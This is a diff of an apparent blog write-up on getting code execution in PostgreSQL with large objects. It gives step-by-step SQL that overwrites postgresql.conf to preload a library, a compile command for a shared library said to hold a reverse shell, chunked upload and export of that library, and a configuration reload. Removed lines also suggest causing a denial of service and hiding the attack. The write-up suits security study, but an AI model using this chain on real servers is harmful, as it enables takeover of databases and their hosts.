@@ -1,5 +1,6 @@
 ---
 layout: post
+title: PostgreSQL RCE via large objects
 comments: false
 categories: Works
 ---
@@ -8,10 +9,12 @@ categories: Works
 
 ---
 
+[PostgreSQL large-object server functions](https://www.postgresql.org/docs/current/lo-funcs.html) · [`session_preload_libraries`](https://www.postgresql.org/docs/current/runtime-config-client.html#GUC-SESSION-PRELOAD-LIBRARIES)
+
 ### Large Object
 
 A large object is a special type of data that provides stream-style access to data that is too large to be manipulated as a whole.
-Each large object is stored as a separate object in the `pg_largeobject` system catalog, independent of the main table.
+Large-object contents are split into pages stored as rows in `pg_largeobject`, while their metadata and ownership information are stored in `pg_largeobject_metadata`.
 
 - Privileges
 
@@ -19,7 +22,7 @@ If updating an existing large object (by providing its `lobj_oid`), the user mus
 
 ### lo_from_bytea
 
-The function `lo_from_bytea()` is used to create a large object (LOB) from a binary data value stored in a `BYTEA` column.
+The function `lo_from_bytea()` creates a large object (LOB) from a `bytea` value. The value does not have to come from a table column.
 
 - Syntax
 
@@ -60,7 +63,9 @@ SELECT lo_export(oid, filename);
 SELECT lo_export(12345, '/tmp/exported_file.bin');
 ```
 
-Data in Large Object 12345 will be written on “/tmp/exported_file.bin”
+The contents of large object `12345` will be written to `/tmp/exported_file.bin`.
+
+Server-side `lo_import` and `lo_export` access the database server's filesystem with the operating-system permissions of the PostgreSQL server process. PostgreSQL therefore restricts them to superusers by default, although execution privileges can be granted explicitly to another role.
 
 ### lo_import
 
@@ -103,7 +108,7 @@ SELECT lo_get(12345);
 (1 row)
 ```
 
-Bring the data in large object 12345
+This returns the data stored in large object `12345`.
 
 ### lo_put
 
@@ -138,11 +143,13 @@ SELECT *, encode(data, 'escape') FROM pg_largeobject WHERE loid = 16394;
 
 The `session_preload_libraries` configuration parameter in PostgreSQL is used to specify a list of shared libraries that should be loaded automatically whenever a new session starts.
 
-So when we add malicious shared library in server’s file system and edit `session_preload_libraries` as path of malicious shared library, postgreSQL will execute a `init` function in the library. This means attacker can trigger RCE with controlling `session_preload_libraries`.
+If an attacker can write a malicious shared library to the server's filesystem and control `session_preload_libraries`, PostgreSQL will load the library when a new session starts. In this example, the ELF loader runs the library's `_init()` function, which leads to code execution as the PostgreSQL operating-system user.
+
+This chain assumes powerful privileges: the attacker must be able to call server-side `lo_export`, overwrite the active configuration file, reload the configuration, and write to a location from which PostgreSQL can load a library. These capabilities are normally restricted to a superuser or to roles that have been granted equivalent privileges, so this is a privilege-abuse technique rather than a standalone unauthenticated PostgreSQL vulnerability.
 
 ### Version
 
-First check the postgreSQL version with following command:
+First, check the PostgreSQL version with the following command:
 
 ```sql
 SELECT version();
@@ -179,19 +186,19 @@ SELECT version();
  default_text_search_config = 'pg_catalog.english'
     
  dynamic_library_path = '/tmp:$libdir'
- session_preload_libraries = '/tmp/payload.so'
+ session_preload_libraries = '/tmp/stock.so'
 ```
 
-I made a fake config file. In the file, I changed path of `session_preload_libraries` as `/tmp/payload.so`. Later I will upload malicious shared library in `/tmp/payload.so` .
+I created a replacement configuration file and set `session_preload_libraries` to `/tmp/stock.so`. Later, I upload the malicious shared-library bytes to that server-side path.
 
 ```sql
 SELECT lo_from_bytea(1234566, decode('ICMgLSBDb25uZWN0aW9uIFNldHRpbmdzIC0KIGxpc3Rlbl9hZGRyZXNzZXMgPSAnKicKIG1heF9jb25uZWN0aW9ucyA9IDEwMAogICAgCiAjIC0gTWVtb3J5IC0KIHNoYXJlZF9idWZmZXJzID0gMTI4TUIKIGR5bmFtaWNfc2hhcmVkX21lbW9yeV90eXBlID0gcG9zaXgKICAgIAogIyAtIENoZWNrcG9pbnRzIC0KIG1heF93YWxfc2l6ZSA9IDFHQgogbWluX3dhbF9zaXplID0gODBNQgogICAgCiAjIC0gV2hhdCB0byBMb2cgLQogbG9nX3RpbWV6b25lID0gJ0V0Yy9VVEMnCiAgICAKICMgLSBMb2NhbGUgYW5kIEZvcm1hdHRpbmcgLQogZGF0ZXN0eWxlID0gJ2lzbywgbWR5JwogdGltZXpvbmUgPSAnRXRjL1VUQycKICAgIAogIyBUaGVzZSBzZXR0aW5ncyBhcmUgaW5pdGlhbGl6ZWQgYnkgaW5pdGRiLCBidXQgdGhleSBjYW4gYmUgY2hhbmdlZC4KIGxjX21lc3NhZ2VzID0gJ2VuX1VTLnV0ZjgnCiBsY19tb25ldGFyeSA9ICdlbl9VUy51dGY4JwogbGNfbnVtZXJpYyA9ICdlbl9VUy51dGY4JwogbGNfdGltZSA9ICdlbl9VUy51dGY4JwogICAgCiAjIGRlZmF1bHQgY29uZmlndXJhdGlvbiBmb3IgdGV4dCBzZWFyY2gKIGRlZmF1bHRfdGV4dF9zZWFyY2hfY29uZmlnID0gJ3BnX2NhdGFsb2cuZW5nbGlzaCcKICAgIAogZHluYW1pY19saWJyYXJ5X3BhdGggPSAnL3RtcDokbGliZGlyJwogc2Vzc2lvbl9wcmVsb2FkX2xpYnJhcmllcyA9ICcvdG1wL3N0b2NrLnNvJw==', 'base64'));
 SELECT lo_export(1234566, '/var/lib/postgresql/data/postgresql.conf');
 ```
 
-Encode the fake configuration into a base64 string and overwrite the existing configuration using a large object.
+The SQL decodes the replacement configuration from base64 and overwrites the active configuration file through a large object.
 
-Additionally, admin can change conf file path via `-c` . In this case, we can read path of conf file with pg_file_settings.
+An administrator can select a different configuration file with the server's `config_file` option. The active source file can be inspected through `pg_file_settings` when the current role has permission to read that view.
 
 ```sql
 SELECT sourcefile FROM pg_file_settings;
@@ -235,53 +242,53 @@ void _init() {
 }
 ```
 
-I made payload.c that contain reverse shell payload in `init()` function. 
+I created `payload.c`, which contains a reverse-shell payload in its `_init()` function.
 
-I add`PG_MODULE_MAGIC` in the code that is a macro used in C-language extensions to ensure compatibility between the compiled extension and the PostgreSQL server it is being loaded into.
+I added `PG_MODULE_MAGIC`, a macro used by C-language extensions so PostgreSQL can verify that a loaded module is binary-compatible with the server.
 
-I compiled the code and made shared library `payload.so` with following command line:
+I compiled the code into the shared library `payload.so` with the following command:
 
 ```bash
 # compile
 gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -fno-stack-protector -o payload.so payload.c
 ```
 
- The next step is to upload this binary using a large object. To upload to large object, I split the lib into base64 encoded chunks.
+The next step is to upload this binary using a large object. I split the library into base64-encoded chunks.
 
 And I sequentially inserted each chunk into a large object.
 
-I uploaded the first chunk of the .so lib in a new lo object.
+I uploaded the first chunk of the `.so` file into a new large object.
 
 ```sql
 SELECT lo_from_bytea(133301, decode('f0VMRgIBAQAAAAA...=', 'base64'));
 ```
 
-Then uploaded the other chunks by using the `lo_put` .
+I then uploaded the remaining chunks with `lo_put()`.
 
 ```sql
 SELECT lo_put(133301, 2048*n, decode('AAA...=', 'base64'));
 ```
 
-After moving whole .so lib file to large object, export the file to `/tmp/payload.so` 
+After storing the complete `.so` file in the large object, I exported it to the path referenced by the replacement configuration.
 
 ```sql
-SELECT lo_export(133301, '/tmp/payload.so');
+SELECT lo_export(133301, '/tmp/stock.so');
 ```
 
-### Reload_conf
+### Reload configuration
 
-I need to reload because the changed config file is not applied.
+The changed configuration must be reloaded before PostgreSQL reads the new value.
 
-`pg_reload_conf` function supports applying new config file to the postgreSQL system.
+`pg_reload_conf()` asks the PostgreSQL server processes to reload their configuration files.
 
 ```sql
 SELECT pg_reload_conf();
 ```
 
-After reloading, When a query comes in, the init() function of the payload.so file will be executed.
+After the reload, the new `session_preload_libraries` value takes effect only when a new connection starts. At that point PostgreSQL loads `/tmp/stock.so`, and its `_init()` function runs.
 
-But there is big problem in this scenario.
+There is an important limitation in this scenario.
 
-`pg_reload_conf` is only allowed for superuser level. If the attacker have superuser Privilege, the attacker can trigger rce right away, but if not, the attacker have to wait for admin to reload the system. The attacker can trigger a DoS attack using `pg_sleep` or recursive function calls. Such actions may prompt the admin to reload the system.
+Calling `pg_reload_conf()` is normally restricted to superusers unless its execution privilege has been granted explicitly. Without that privilege, the attacker must wait for an administrator or another authorized process to reload the configuration. Deliberately causing a denial of service does not guarantee that an administrator will reload it and is not a reliable step in the chain.
 
-Additionally, I discovered something interesting. Triggering RCE through a flawless configuration file makes PostgreSQL unusable. However, loading a malicious shared library via a configuration file with errors allows PostgreSQL to remain functional. This method enables RCE to be executed without detection by the victim.
+A malformed setting can be rejected while other valid settings remain active, and PostgreSQL records configuration errors in `pg_file_settings` and the server logs. This behavior is environment-dependent and does not make the technique stealthy; successful application of each setting should be checked explicitly.
